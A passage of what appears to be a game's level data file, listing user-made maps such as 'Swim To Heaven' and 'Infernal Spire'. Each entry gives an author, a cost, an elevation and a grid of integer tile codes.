,0,0,0,0,0,0,0,21,24,24,24,24,21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,24,24,24,24,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,24,24,24,24,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,24,24,24,24,16,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,24,24,24,24,14,14,14,0,0,0,0,0,0,0,0,0,0,14,134,14,24,24,24,24,14,132,14,0,0,0,0,0,0,0,0,0,0,14,14,14,24,24,24,24,14,14,14,0,0,0,0,0,0,0,93,24,24,24,24,24,24,2,2,24,24,24,24,24,24,93,0,0,0]});
maps.push({name="tp jumps are easy",author="fara",id="#1661372710",direction="forward",cost=180,elevation=0,map=[5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,7,27,7,0,0,25,25,25,25,0,0,0,26,0,0,0,7,0,0,0,27,97,27,0,0,25,25,25,25,0,5,0,0,0,26,0,0,0,28,0,7,27,7,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,1,1,1,1,1,1,1,1,1,1,1,1,5,5,5,5,25,5,132,25,5,131,5,5,131,5,5,131,5,5,131,5,5,93,94,5,25,5,5,25,1,1,1,1,1,1,1,1,1,1,1,1,5,93,94,5,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,0,26,0,0,0,7,0,0,0,7,0,6,26,6,0,0,25,25,25,25,0,0,0,6,0,0,0,26,0,0,0,26,97,26,0,0,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,6,26,6,0,0,96,96,96,96,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Swim To Heaven",author="MoistNoodlez",id="#1661379042",direction="forward",cost=128,elevation=18,map=[0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,66,66,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,67,67,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,66,66,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,66,66,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,67,67,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,66,66,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,66,66,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,67,67,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,66,66,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,66,66,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,67,67,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,66,66,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,66,66,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,67,67,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,66,66,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,66,66,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,67,67,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,66,66,23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,23,2,2,23,0,0,0,0,0,0,0,0,0]});
maps.push({name="Sussy Baka",author="MoistNoodlez",id="#1661379970",direction="right",cost=525,elevation=0,map=[0,0,0,0,0,1,1,1,1,2,2,1,1,1,0,0,0,0,0,0,0,0,0,0,1,1,76,107,107,107,107,107,107,1,1,0,0,0,0,0,0,0,0,0,1,76,76,76,107,107,107,107,107,107,1,0,0,0,0,0,0,0,0,0,1,76,76,76,76,107,107,107,107,107,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,5,5,5,1,1,1,1,1,1,1,1,0,1,1,76,76,76,76,76,107,107,107,107,107,107,107,107,107,107,107,1,1,1,76,76,76,76,76,76,76,76,76,107,107,107,107,107,107,107,107,1,1,76,76,76,76,76,76,76,76,76,76,76,107,107,107,107,107,107,107,1,1,76,76,76,76,76,76,76,76,76,76,76,76,107,107,107,67,67,1,0,1,76,76,76,1,1,76,76,76,76,76,76,76,107,107,91,91,67,1,0,1,76,76,1,70,70,1,76,76,76,76,76,76,107,91,91,91,1,1,0,1,76,1,66,66,70,70,1,76,76,76,76,76,91,91,91,91,67,1,0,1,76,1,65,66,66,70,1,76,76,76,76,76,91,91,91,67,67,107,1,1,1,1,65,66,66,70,1,76,76,76,76,91,91,91,107,107,107,107,2,0,1,1,65,66,66,70,1,76,76,76,91,91,91,91,107,107,107,107,2,0,0,1,65,66,66,70,1,1,1,1,91,91,91,1,1,1,1,1,1,0,0,0,1,66,66,1,0,0,0,91,91,91,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,93,91,91,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Severed",author="Block",id="#1661380130",direction="forward",cost=270,elevation=0,map=[14,14,13,12,11,10,9,9,9,0,0,9,0,0,9,0,9,9,2,2,14,14,13,12,11,10,9,0,0,9,0,0,18,0,0,9,0,9,9,9,15,15,1,1,1,9,9,0,0,0,9,0,0,9,9,0,9,9,0,9,16,16,1,0,0,9,0,0,9,0,14,9,9,0,0,9,9,0,9,9,17,17,1,24,9,9,0,24,0,9,0,0,0,0,9,0,0,0,0,9,18,18,1,0,9,9,0,0,19,19,19,19,0,9,9,0,24,0,9,9,19,19,0,9,9,0,0,9,0,0,0,19,9,9,0,0,0,9,9,9,20,20,0,9,0,0,0,0,0,0,9,9,9,0,0,9,9,0,9,10,21,21,9,9,0,0,9,0,9,9,0,9,0,9,9,0,0,0,9,11,22,22,9,0,0,0,0,0,0,0,49,49,15,14,13,12,11,10,9,12,23,23,0,0,9,0,9,0,0,49,49,49,15,14,13,12,11,10,9,13,24,24,0,9,0,0,0,0,49,49,0,1,1,1,1,1,1,9,9,14,24,24,9,0,18,18,0,49,49,0,0,1,94,9,9,0,0,9,1,15,24,24,9,0,0,0,49,49,0,0,0,1,9,0,0,0,0,9,1,16,24,24,9,0,49,49,49,0,0,9,9,1,9,9,0,0,0,0,1,17,9,9,0,0,0,49,0,24,9,0,0,1,0,0,0,9,0,9,1,18,9,9,9,9,0,0,9,24,0,9,0,1,9,9,9,9,9,9,1,19,9,9,9,9,13,0,0,24,9,0,0,9,9,9,9,1,1,1,1,20,9,9,9,9,0,9,9,9,9,9,9,9,24,24,24,24,23,22,21,21,2,2,9,9,9,9,24,24,24,24,24,24,24,24,24,24,23,22,21,21]});
maps.push({name="833",author="Niikos",id="#1661382568",direction="forward",cost=833,elevation=10,map=[80,2,2,80,80,80,80,80,80,80,80,80,80,1,1,1,80,80,80,80,80,34,34,80,80,80,80,100,40,40,40,86,40,100,1,34,34,86,34,100,80,34,34,80,80,80,80,40,86,40,100,40,40,40,1,34,100,34,34,34,80,80,80,80,80,80,80,40,40,80,80,80,38,86,1,34,34,1,34,86,80,54,54,40,100,40,86,40,40,80,80,80,100,38,1,100,34,1,100,86,80,100,54,40,40,40,40,40,100,80,80,80,36,36,1,34,86,1,36,36,80,80,80,80,80,80,80,80,80,80,80,80,86,36,1,34,34,1,36,100,80,54,100,80,80,80,80,80,80,80,80,80,34,100,1,34,100,1,38,38,80,54,54,80,80,80,80,80,80,80,80,80,34,34,1,34,34,1,100,38,80,80,80,80,80,80,80,80,80,80,80,80,100,34,86,34,34,1,86,40,80,54,54,80,80,80,80,80,80,80,80,80,34,34,34,100,34,1,40,100,80,54,100,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,42,42,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,100,42,80,100,54,40,100,40,40,100,80,80,80,44,44,44,100,42,86,42,42,42,80,54,54,40,40,40,93,93,80,80,80,44,100,44,44,42,42,100,42,42,80,80,80,80,80,40,40,40,80,80,80,44,86,80,80,80,80,80,80,80,80,54,54,36,36,38,94,94,80,80,80,100,44,80,80,80,80,80,80,80,80,54,54,36,100,38,38,100,80,80,80,44,44,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,44,44,100,44,86,44,100,44,80,80,80,80,80,80,80,80,80,80,80,80,86,44,44,44,100,44,2,2,80]});
maps.push({name="900",author="Niikos",id="#1661384985",direction="forward",cost=900,elevation=13,map=[0,0,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,2,2,80,0,0,80,80,80,80,80,80,80,80,94,29,29,29,29,29,29,29,29,80,0,0,80,93,100,80,80,80,80,80,94,29,29,29,29,29,29,29,29,80,0,80,80,42,42,80,80,80,80,80,94,29,29,29,29,29,29,29,29,80,0,80,80,127,42,80,80,80,80,80,80,80,80,80,80,80,80,29,29,80,0,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,4,4,80,0,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,34,34,80,0,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,34,34,80,0,80,80,80,80,80,80,80,80,80,80,80,93,34,34,34,34,34,34,80,0,80,80,80,80,80,80,80,80,80,80,80,97,34,34,34,34,34,34,80,0,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80,34,34,80,0,80,80,42,126,80,80,80,80,42,42,80,80,80,80,80,80,34,34,80,0,80,80,42,42,80,80,80,80,42,42,80,80,80,80,80,0,96,96,0,0,80,80,42,42,80,80,80,80,132,132,80,80,80,80,80,80,34,34,80,0,80,80,42,42,80,80,80,80,42,42,80,80,80,80,80,80,34,34,80,0,80,80,42,42,80,80,80,80,42,42,80,80,80,80,80,80,34,34,80,0,80,80,42,42,80,80,80,80,42,42,80,80,80,80,80,80,34,34,80,0,0,80,42,42,42,42,42,42,42,42,80,80,80,80,80,80,34,34,80,0,0,80,42,42,42,42,42,42,42,42,80,80,80,80,80,80,131,131,80,0,0,80,2,2,80,80,80,80,80,80,80,80,80,80,80,80,80,80,80]});
maps.push({name="eden",author="blasian",id="#1661389638",direction="right",cost=315,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,1,14,14,14,14,1,1,14,131,1,0,0,0,0,0,0,1,1,1,1,1,14,14,1,1,1,1,14,14,1,0,0,0,0,0,0,1,14,14,96,14,14,14,14,14,1,1,14,14,1,0,0,0,0,0,0,1,14,14,96,14,14,14,94,97,1,1,14,14,1,0,0,0,0,0,0,1,14,14,1,1,1,1,1,1,1,1,14,14,1,0,0,0,0,0,0,1,14,14,1,67,67,67,67,93,1,67,101,101,1,0,0,0,0,0,0,1,14,14,1,14,14,14,14,14,1,67,14,14,1,0,0,0,0,0,0,1,14,14,1,14,14,14,14,14,1,67,14,14,1,1,1,1,1,1,0,1,14,14,1,14,132,14,104,133,1,67,14,14,103,14,14,14,14,2,0,1,14,14,1,14,14,14,14,14,1,67,14,14,103,14,14,134,14,2,0,1,99,14,1,14,14,14,14,14,1,67,14,14,1,1,1,1,1,1,0,1,94,14,1,67,67,67,67,93,1,67,14,14,1,0,0,0,0,0,0,1,14,14,1,1,1,1,1,1,1,67,14,14,1,0,0,0,0,0,0,1,14,14,98,14,14,14,14,14,14,14,14,94,1,0,0,0,0,0,0,1,14,14,98,14,14,14,14,14,14,14,14,102,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="copied city",author="blasian",id="#1661389689",direction="forward",cost=206,elevation=7,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,14,14,14,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,16,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,20,20,20,1,1,1,1,1,1,0,0,0,0,0,1,93,85,21,21,1,21,21,90,1,21,21,85,93,1,0,0,0,0,0,1,21,21,85,21,1,90,21,21,1,21,85,21,21,1,0,0,0,0,0,1,85,21,21,21,1,21,21,21,1,21,21,21,85,1,0,0,0,0,0,1,93,91,85,85,1,90,21,90,1,85,85,91,93,1,0,0,0,0,0,1,85,21,85,85,1,21,21,21,1,85,85,21,85,1,0,0,0,0,0,1,21,21,21,21,1,21,90,21,1,21,21,21,21,1,0,0,0,0,0,1,21,87,21,21,21,21,21,21,21,21,21,87,21,1,0,0,0,0,0,1,99,21,21,94,21,21,21,21,21,94,21,21,97,1,0,0,0,0,0,1,1,1,1,1,1,0,96,96,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,98,98,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="limbo",author="blasian",id="#1661389900",direction="forward",cost=238,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,94,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,94,0,0,15,15,15,15,15,15,15,15,14,14,13,13,13,13,13,13,13,13,0,0,15,15,15,15,15,15,15,15,1,1,13,13,13,13,13,13,13,13,0,0,15,15,0,0,0,0,0,1,0,0,1,0,0,0,0,0,13,13,0,0,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,0,0,15,15,0,0,0,1,1,1,1,1,1,1,1,0,0,0,13,13,0,0,15,133,0,0,0,1,93,15,1,1,13,93,1,0,0,0,131,13,0,0,0,0,0,0,0,1,99,1,0,0,1,97,1,0,0,0,0,0,0,0,0,0,0,0,0,1,15,1,0,0,1,13,1,0,0,0,0,0,0,0,0,0,0,0,0,1,15,1,0,0,1,13,1,0,0,0,0,0,0,1,15,15,1,0,0,1,15,1,0,0,1,13,1,0,0,1,13,13,1,1,15,15,1,0,0,1,15,1,0,0,1,13,1,0,0,1,134,13,1,1,15,132,1,0,0,1,15,1,0,0,1,13,1,0,0,1,13,13,1,1,15,15,1,1,1,1,15,1,0,0,1,13,1,1,1,1,13,13,1,1,15,15,15,15,15,15,15,96,14,14,98,13,13,13,13,13,13,13,1,1,15,15,15,15,15,15,15,96,14,14,98,13,13,13,13,13,13,13,1,1,1,1,1,1,1,1,1,1,14,14,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="Double Tower",author="MoistNoodlez",id="#1661390957",direction="forward",cost=356,elevation=0,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,90,5,5,90,5,90,5,1,1,1,1,1,1,1,1,0,0,5,5,5,5,5,5,5,5,5,5,5,124,124,124,124,124,124,1,0,0,90,5,5,5,5,5,5,5,5,90,5,124,124,124,124,124,124,1,0,0,90,5,5,5,5,5,5,5,90,65,5,124,55,54,53,52,124,1,0,0,90,5,5,5,5,5,5,5,5,90,5,124,56,5,5,51,124,1,0,0,5,5,5,5,5,5,5,5,5,5,5,124,57,5,5,50,124,1,0,0,90,5,90,5,90,5,5,5,5,5,5,124,58,5,5,49,124,1,0,1,1,1,1,1,1,1,5,5,5,5,5,91,45,46,47,48,124,1,0,1,124,124,124,124,124,124,5,5,5,5,5,1,1,1,1,1,124,1,0,1,124,52,53,54,55,124,5,90,5,5,90,1,100,124,124,124,124,1,0,1,124,51,5,5,56,124,5,65,90,5,5,1,1,1,1,1,1,1,0,1,124,50,5,5,57,124,5,90,5,5,5,5,5,90,5,90,5,5,0,1,124,49,5,5,58,124,5,5,5,5,5,5,5,5,5,5,5,5,0,1,124,48,47,46,45,91,5,5,5,5,5,5,5,5,5,5,5,5,0,1,124,1,1,1,1,1,5,5,5,5,5,5,90,5,90,5,90,5,0,1,124,124,124,124,100,1,5,5,5,5,5,5,5,5,5,5,5,5,0,1,124,124,124,124,124,1,5,5,5,5,5,5,5,5,5,5,5,5,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Twin Skyscraper v2",author="MoistNoodlez",id="#1661390991",direction="forward",cost=274,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,5,5,5,5,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,5,5,5,5,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,5,5,5,5,94,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,90,5,90,90,5,5,5,5,93,93,5,5,5,5,90,90,5,90,0,0,5,5,5,5,5,5,90,5,5,5,5,90,5,5,5,5,5,5,0,0,5,5,90,124,124,90,5,5,65,65,5,5,90,124,124,90,5,5,0,0,5,5,105,105,92,124,5,90,65,65,90,5,124,92,105,105,5,5,0,0,5,5,124,124,97,124,5,90,65,65,90,5,124,97,124,124,5,5,0,0,5,5,90,124,124,5,5,5,65,65,5,5,5,124,124,90,5,5,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,90,5,5,90,5,5,5,5,5,5,5,5,5,5,90,5,5,90,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,96,96,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,96,96,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0]});
maps.push({name="Binate Belfries",author="Soft Serve",id="#1661413743",direction="forward",cost=213,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,94,45,45,5,5,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,45,45,90,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,1,1,105,1,1,1,1,90,5,0,0,0,0,0,0,0,0,0,0,0,1,36,26,38,39,127,1,5,5,0,0,0,0,0,0,0,0,0,94,45,105,26,127,0,0,0,1,26,26,0,0,0,0,0,0,0,0,0,45,45,1,0,0,0,0,0,1,27,27,0,0,0,0,0,0,0,0,0,45,45,1,0,0,0,24,24,64,26,26,0,0,0,93,93,0,0,0,0,0,0,1,126,31,0,24,100,1,5,5,0,0,0,22,22,0,3,0,0,0,0,1,1,1,1,64,1,1,5,5,94,5,125,5,45,90,45,25,26,27,27,26,25,45,45,45,5,5,5,90,90,5,5,5,45,45,45,25,26,27,27,26,25,45,90,45,5,125,5,94,5,5,1,1,64,1,1,1,1,0,0,0,0,3,0,22,22,0,0,0,5,5,1,100,24,50,0,0,1,0,0,0,0,0,0,93,93,0,0,0,26,26,64,24,24,0,0,48,1,45,45,0,0,0,0,0,0,0,0,0,27,27,1,56,0,52,0,0,1,45,45,0,0,0,0,0,0,0,0,0,26,26,1,0,0,0,26,26,105,45,94,0,0,0,0,0,0,0,0,0,5,5,1,0,54,0,26,0,1,0,0,0,0,0,0,0,0,0,0,0,5,90,1,1,1,1,105,1,1,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,90,45,45,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,5,5,45,45,94,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Infernal Spire",author="Soft Serve",id="#1661425582",direction="left",cost=481,elevation=18,map=[0,0,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,0,0,0,1,1,77,77,77,77,6,1,106,106,1,77,0,0,0,77,1,1,0,1,1,75,75,75,75,75,6,1,106,106,1,0,5,5,5,5,5,1,1,1,94,75,75,75,6,75,6,95,106,106,95,26,5,76,76,76,5,77,1,1,6,75,6,75,75,75,6,1,106,106,1,0,5,76,76,76,5,0,1,1,94,75,75,75,75,75,6,1,106,106,1,0,5,76,76,76,5,0,1,1,75,75,75,75,75,75,6,1,1,1,1,77,5,5,5,3,5,0,1,1,75,14,75,14,75,14,1,1,77,77,1,1,77,0,0,32,0,77,1,1,1,1,95,1,1,1,1,0,0,0,0,1,1,1,1,95,1,1,1,2,124,124,124,124,124,95,0,0,44,93,0,77,1,112,112,112,112,112,1,2,124,124,124,124,124,95,0,0,44,93,0,77,1,112,112,112,112,112,1,1,1,1,95,1,1,1,1,0,0,0,0,1,1,1,1,95,1,1,1,1,4,24,24,24,24,24,1,1,77,77,1,1,0,33,32,32,32,33,1,1,21,0,44,0,0,92,16,1,1,1,1,77,0,34,19,19,19,34,1,1,21,0,44,0,0,0,16,1,118,118,1,77,0,35,19,93,19,35,1,1,21,0,24,0,0,0,17,1,118,118,1,0,0,36,18,18,18,36,1,1,21,21,92,15,36,37,18,95,118,118,95,18,17,17,17,17,17,17,1,1,1,21,21,0,0,0,18,1,118,118,1,0,0,0,0,0,0,1,1,0,1,1,21,21,21,21,4,1,118,118,1,77,77,0,77,77,1,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0]});
maps.push({name="Mesh Garden",author="Soft Serve",id="#1661432710",direction="forward",cost=288,elevation=6,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,24,97,54,40,54,24,54,54,54,54,0,0,1,1,1,0,0,0,0,0,0,54,54,40,54,54,54,54,54,54,0,0,1,134,20,102,54,54,24,0,0,54,54,0,0,103,103,103,54,54,0,0,1,1,1,0,0,54,0,0,0,54,54,0,0,103,131,103,54,54,0,0,0,0,0,0,96,96,96,96,96,96,96,96,0,103,103,103,54,24,0,0,0,0,0,0,0,54,0,0,0,54,54,0,0,0,0,0,54,54,0,0,0,0,0,24,0,54,0,0,95,95,95,95,0,0,0,0,40,40,0,0,0,0,54,54,54,54,54,54,95,65,65,95,54,24,54,54,54,54,0,0,0,0,54,54,54,54,24,54,95,65,65,95,54,54,54,54,54,54,0,0,0,0,40,40,0,0,0,0,95,95,95,95,0,0,54,0,24,0,0,0,0,0,54,54,0,0,0,0,0,54,54,0,0,0,54,0,0,0,0,0,0,0,24,54,101,101,101,0,98,98,98,98,98,98,98,98,0,0,0,0,0,0,54,54,101,133,101,0,0,54,54,0,0,0,54,0,0,1,1,1,0,0,54,54,101,101,101,0,0,54,54,0,0,24,54,54,104,20,132,1,0,0,54,54,54,54,54,54,40,54,54,0,0,0,0,0,0,1,1,1,0,0,54,54,54,54,24,54,40,54,99,24,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="EpicCrouchDefense",author="Niikos",id="#1661436399",direction="forward",cost=320,elevation=10,map=[1,1,1,1,1,1,49,49,49,2,2,49,49,49,1,1,1,1,1,1,49,49,49,49,94,1,49,49,49,49,49,49,49,49,1,132,49,49,49,93,49,49,49,49,94,1,49,49,49,49,49,49,49,49,1,49,49,49,49,93,49,49,49,49,94,1,49,49,49,49,49,49,49,49,1,49,49,49,49,97,49,49,49,49,94,1,49,49,49,49,49,49,49,49,1,49,49,49,49,136,49,49,1,1,1,1,106,106,106,106,106,106,106,106,1,1,1,1,1,1,49,49,49,49,49,49,48,48,48,48,48,48,48,48,108,0,0,0,0,0,49,49,49,49,49,49,49,49,49,49,49,49,49,49,109,0,0,0,0,0,49,49,49,49,49,49,49,49,49,49,49,49,49,49,109,4,34,36,38,40,49,133,133,49,49,49,49,49,49,49,49,49,49,49,109,0,0,0,0,0,49,133,133,49,49,49,49,49,49,49,49,49,49,49,109,0,0,0,0,40,49,49,49,49,49,49,49,49,49,49,49,49,49,49,109,0,0,0,0,131,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,39,39,39,39,39,39,39,39,39,39,39,0,0,0,0,0,0,128,44,44,39,134,134,39,39,39,39,39,39,39,39,0,0,0,0,0,0,128,44,44,39,134,134,39,39,39,39,39,39,39,39,0,0,0,0,0,0,128,44,44,39,39,39,39,39,39,39,39,39,39,39,0,0,0,0,0,0,44,44,44,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,44,137,44,0,0,0,0,0,0,0,0,0,96,96,0,0,0,0,0,0,44,44,44,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Just Smile",author="Niikos",id="#1661437167",direction="forward",cost=401,elevation=0,map});
maps.push({name="Boost Yo Self",author="Block",id="#1661437476",direction="forward",cost=216,elevation=0,map=[0,0,0,0,12,12,12,12,2,2,12,12,12,12,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,12,12,1,1,12,12,1,1,12,12,0,0,0,0,0,0,0,0,0,0,12,12,1,1,12,12,1,1,12,12,0,0,0,0,0,0,0,0,0,0,127,127,1,1,12,12,1,1,127,127,0,0,0,0,0,0,0,0,0,0,12,12,1,1,12,12,1,1,12,12,0,0,0,0,0,0,0,0,0,0,12,12,1,1,12,12,1,1,12,12,0,0,0,0,0,0,0,0,0,0,12,12,1,1,12,12,1,1,12,12,0,0,0,0,0,0,0,0,0,0,12,12,1,1,12,12,1,1,12,12,0,0,0,0,0,0,0,0,0,0,12,12,1,1,12,12,1,1,12,12,0,0,0,0,0,0,0,0,0,0,12,12,1,1,12,12,1,1,12,12,0,0,0,0,0,0,0,0,0,0,127,127,1,1,12,12,1,1,127,127,0,0,0,0,0,0,0,0,0,0,12,12,1,1,12,12,1,1,12,12,0,0,0,0,0,0,0,0,0,0,12,12,1,1,12,12,1,1,12,12,0,0,0,0,0,0,0,0,0,0,12,12,1,1,12,12,1,1,12,12,0,0,0,0,0,0,0,0,0,0,12,12,1,1,12,12,1,1,12,12,0,0,0,0,0,0,0,0,0,0,12,12,1,1,12,12,1,1,12,12,0,0,0,0,0,0,0,0,0,0,12,12,1,1,12,12,1,1,12,12,0,0,0,0,0,0,0,0,0,0,12,12,12,12,12,12,12,12,12,12,0,0,0,0,0,0,0,0,0,0,12,12,12,12,2,2,12,12,12,12,0,0,0,0,0,0]});
maps.push({name="Got Em",author="Niikos",id="#1661438235",direction="forward",cost=268,elevation=0,map=[0,0,0,0,0,0,0,0,1,2,2,39,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,39,39,39,39,39,39,39,1,0,0,0,0,0,0,0,0,0,0,1,39,39,39,39,39,39,39,39,39,1,0,0,0,0,0,0,0,0,0,1,39,39,1,1,1,39,39,39,39,39,1,0,0,0,0,0,0,0,0,1,39,39,1,0,0,1,39,39,39,39,39,1,0,0,0,0,1,0,0,1,39,39,1,0,0,0,1,39,39,39,39,39,1,0,0,1,39,1,0,1,39,39,1,0,0,0,1,39,39,39,39,39,1,0,1,1,39,39,1,1,39,39,39,1,1,1,39,39,39,39,39,39,1,1,39,1,97,39,39,39,1,39,39,39,39,39,39,39,39,39,39,39,1,1,39,39,1,39,39,39,39,1,39,39,39,39,39,39,39,39,39,39,1,1,39,39,39,1,39,39,39,39,1,1,39,39,39,39,39,39,39,39,1,1,39,39,39,39,1,39,39,39,39,39,39,39,39,39,39,39,39,94,1,0,1,39,39,39,39,1,1,1,39,39,39,39,39,39,39,39,93,94,1,0,0,1,39,39,39,39,1,1,1,39,39,39,39,39,39,39,93,1,0,0,0,0,1,39,39,39,39,39,39,39,39,39,39,39,39,39,1,0,0,0,0,0,0,1,39,39,39,39,39,39,39,39,39,39,39,1,0,0,0,0,0,0,0,0,1,39,39,39,39,39,39,39,39,39,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,96,96,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0]});
